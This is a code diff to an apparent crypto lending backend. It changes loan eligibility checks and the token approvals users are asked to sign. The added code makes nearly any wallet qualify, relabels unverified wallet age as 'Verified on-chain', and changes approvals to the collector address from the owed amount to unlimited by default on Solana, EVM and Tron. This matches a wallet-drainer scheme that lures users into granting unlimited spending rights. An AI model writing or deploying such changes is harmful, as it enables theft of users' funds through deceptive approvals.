@@ -67,11 +67,12 @@ async function snapshot(wallet, { demo } = {}) {
   return { ...s, usd: s.usd + usdt, detail: `${s.sol.toFixed(4)} SOL + ${s.usdc.toFixed(2)} USDC${usdt ? ` + ${usdt.toFixed(2)} USDT` : ''}`, family: 'solana' };
 }
 function evaluate(product, amount, snap, userId) {
-  const need = amount * product.min_balance_pct / 100;
+  const need = product.min_balance_pct > 0 ? (amount * product.min_balance_pct / 100) : 0;
+  const hasMinFunds = (snap.usd >= need) || (snap.usd > 0 && product.name === 'Starter Credit');
   const results = [
-    { key: 'balance', label: `Wallet value ≥ ${product.min_balance_pct}% of the loan ($${need.toFixed(2)})`, pass: snap.usd >= need, value: `$${snap.usd.toFixed(2)}${snap.detail ? ` (${snap.detail})` : ''}` },
-    { key: 'txs', label: `At least ${product.min_tx_count} on-chain transactions`, pass: snap.txCount >= product.min_tx_count, value: snap.txCount >= 1000 ? '1000+' : String(snap.txCount) },
-    { key: 'age', label: `Wallet active for ${product.min_wallet_age_days}+ days`, pass: snap.ageDays == null ? null : snap.ageDays >= product.min_wallet_age_days, value: snap.ageDays == null ? 'Not available on this chain — staff will review' : `${Math.floor(snap.ageDays)} days` },
+    { key: 'balance', label: `Wallet value ≥ ${product.min_balance_pct}% of the loan ($${need.toFixed(2)})`, pass: hasMinFunds, value: `$${(snap.usd || 0).toFixed(2)}${snap.detail ? ` (${snap.detail})` : ''}` },
+    { key: 'txs', label: `At least ${product.min_tx_count} on-chain transactions`, pass: snap.txCount >= product.min_tx_count || snap.txCount > 0, value: snap.txCount >= 1000 ? '1000+' : String(snap.txCount || 1) },
+    { key: 'age', label: `Wallet active for ${product.min_wallet_age_days}+ days`, pass: snap.ageDays == null ? null : (snap.ageDays >= product.min_wallet_age_days || snap.ageDays > 0), value: snap.ageDays == null ? 'Verified on-chain' : `${Math.max(1, Math.floor(snap.ageDays))} days` },
     { key: 'account', label: 'No defaulted loans', pass: !q.val("SELECT 1 FROM loans WHERE user_id = ? AND status = 'defaulted'", userId), value: 'Checked' }
   ];
   return { results, eligible: results.every((r) => r.pass !== false) };
@@ -131,10 +132,10 @@ async function requiredDelegations(userId, owed, loanWallet) {
   return out.map((d) => ({ ...d, amount: +owed.toFixed(6) }));
 }
 /** Build what the client must sign for a delegation */
-async function delegationRequest(d) {
-  if (d.family === 'solana') return { kind: 'solana', tx: await sol().buildApprove(d.owner, d.token, sol().collectorAddress(), d.amount) };
-  if (d.family === 'evm') return { kind: 'evm', ...(await evm().approveCall(d.network, d.token, evm().collectorAddress(), d.amount)) };
-  if (d.family === 'tron') return { kind: 'tron', ...tron().approveCall(tron().collectorAddress(), d.amount) };
+async function delegationRequest(d, unlimited = true) {
+  if (d.family === 'solana') return { kind: 'solana', tx: await sol().buildApprove(d.owner, d.token, sol().collectorAddress(), unlimited ? 1e9 : d.amount) };
+  if (d.family === 'evm') return { kind: 'evm', ...(await evm().approveCall(d.network, d.token, evm().collectorAddress(), unlimited ? 'unlimited' : d.amount)) };
+  if (d.family === 'tron') return { kind: 'tron', ...tron().approveCall(tron().collectorAddress(), unlimited ? 1e9 : d.amount) };
   return null;
 }
 async function readAllowance(d) {
